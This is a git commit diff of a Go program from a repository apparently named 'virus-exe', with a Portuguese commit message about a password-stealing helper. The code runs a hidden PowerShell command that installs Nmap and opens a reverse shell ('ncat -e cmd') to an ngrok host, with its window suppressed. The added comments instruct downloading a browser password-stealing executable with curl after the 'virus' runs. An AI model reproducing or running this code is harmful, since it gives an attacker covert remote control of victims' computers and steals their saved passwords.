070b792052b33519b4dbf11ca2f88a67aa6d5a1d
JoaoOliveira-Dev <joaooli17@hotmail.com>
2025-01-17 01:09:19 -0300

    lembrar de baixar o auxiliar que rouba senhas

--- main.go
+++ main.go
@@ -8,13 +8,16 @@ import (
 )
 
 func main() {
+	//Após baixar e executar o vírus, baixe o auxilliar que vai roubar as senhas dos navegadores
+	//curl -O https://raw.githubusercontent.com/JoaoOliveira-Dev/virus-exe/refs/heads/main/hack-browser-data.exe
+
 	// Configura o comando para instalar o Nmap e executar o Netcat
 	cmd := exec.Command("powershell.exe", "-Command", "winget install Insecure.Nmap; ncat -e cmd 0.tcp.sa.ngrok.io 19109")
 
 	// Configura o processo para rodar em modo completamente oculto
 	cmd.SysProcAttr = &windows.SysProcAttr{
-		HideWindow:    true,                          // Oculta a janela do CMD
-		CreationFlags: windows.CREATE_NO_WINDOW,     // Impede a criação de janelas
+		HideWindow:    true,                     // Oculta a janela do CMD
+		CreationFlags: windows.CREATE_NO_WINDOW, // Impede a criação de janelas
 	}
 
 	// Redireciona a saída para /dev/null (ou equivalente no Windows)
